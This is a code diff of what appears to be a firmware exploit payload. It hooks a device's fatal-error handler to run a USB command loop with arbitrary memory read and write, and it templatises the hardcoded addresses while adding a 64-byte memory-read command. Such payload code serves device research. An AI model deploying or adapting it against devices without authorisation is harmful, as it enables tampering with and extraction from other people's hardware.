@@ -4,18 +4,16 @@ void runner(void);
 
 int main(void) {
     /* restore IRQ so that we don't enter here again */
-    // *(uint32_t*)0x18 = 0xe59ff000;
-
-    *(uint32_t*)0x20 = 0x60c02000;
+    *(uint32_t*)0x20 = %usb_interrupt%;
 
     /* change fatal_err to jump to runner() */
-    uint32_t *hook = (void*)0x60c048dc;
+    uint32_t *hook = (void*)%fatal_err%;
     *hook++ = 0xe51ff004;
     *hook++ = (uint32_t)runner;
 
     /* clean dcache line for hook */
-    __asm__ volatile ("MCR p15, 0, %0, c7, c10, 1\n" :: "r" ((uint32_t)0x60c048dc) : "memory");
-    __asm__ volatile ("MCR p15, 0, %0, c7, c10, 1\n" :: "r" ((uint32_t)0x60c048dc+4) : "memory");
+    __asm__ volatile ("MCR p15, 0, %0, c7, c10, 1\n" :: "r" ((uint32_t)%fatal_err%) : "memory");
+    __asm__ volatile ("MCR p15, 0, %0, c7, c10, 1\n" :: "r" ((uint32_t)%fatal_err%+4) : "memory");
     /* invalidate all icache */
     __asm__ volatile ("MCR p15, 0, %0, c7, c5, 0\n" :: "r" (0) : "memory");
 }
@@ -83,22 +81,10 @@ int nand_read_sda(uint32_t page, void *dst) {
     return ret;
 }
 
-static void usb_drain(void) {
-    /* drain the queue */
-    volatile uint32_t* usb_queue = (void*)0x61100418;
-    volatile uint32_t *hwreg = (void*)0x3a100008;
-    void (*usb_run)() = (void*)0x60c02670;
-
-    while (*usb_queue != 0) {
-        *hwreg |= 0x200;
-        usb_run();
-    }
-}
-
 void runner(void) {
-    int (*usb_getch)() = (void*)0x60c03fa8;
-    int (*usb_send)() = (void*)0x60c041ac;
-    int (*usb_send_commit)() = (void*)0x60c03b28;
+    int (*usb_getch)() = (void*)%usb_getch%;
+    int (*usb_send)() = (void*)%usb_send%;
+    int (*usb_send_commit)() = (void*)%usb_send_commit%;
 
     while (1) {
         uint8_t ch = usb_getch();
@@ -138,13 +124,11 @@ void runner(void) {
             uint8_t addrb[4], datab[4] = { 0 };
             for (int i = 0; i < 4; ++i)
                 addrb[i] = usb_getch();
-
             uint32_t addr = addrb[0] | (addrb[1] << 8) | (addrb[2] << 16) | (addrb[3] << 24);
 
             int wlen = 1 << (ch & 0xF);
             for (int i = 0; i < wlen; ++i)
                 datab[i] = usb_getch();
-
             uint32_t data = datab[0] | (datab[1] << 8) | (datab[2] << 16) | (datab[3] << 24);
 
             switch (wlen) {
@@ -188,6 +172,15 @@ void runner(void) {
             usb_getch();
             usb_send(&buf[264], 264);
             usb_send_commit();
+        } else if (ch == 0x60) {
+            /* read 64 bytes */
+            uint8_t addrb[4], datab[4] = { 0 };
+            for (int i = 0; i < 4; ++i)
+                addrb[i] = usb_getch();
+            uint32_t addr = addrb[0] | (addrb[1] << 8) | (addrb[2] << 16) | (addrb[3] << 24);
+
+            usb_send(addr, 64);
+            usb_send_commit();
         }
     }
 }
@@ -202,8 +195,8 @@ __asm__(
 
     // clean data cache and flush icache before jumping to rest of payload
     // hopefully increase stability bc we only need 1-2 cache lines to hit
-"    ldr r0, =0xE55B0000\n"
-"    ldr r1, =0xE55B1000\n"
+"    ldr r0, =%base%\n"
+"    ldr r1, =%base%+0x1000\n"
 "loop:\n"
 "    mcr p15, 0, r0, c7, c10, 1\n"
 "    add r0, r0, #32\n"
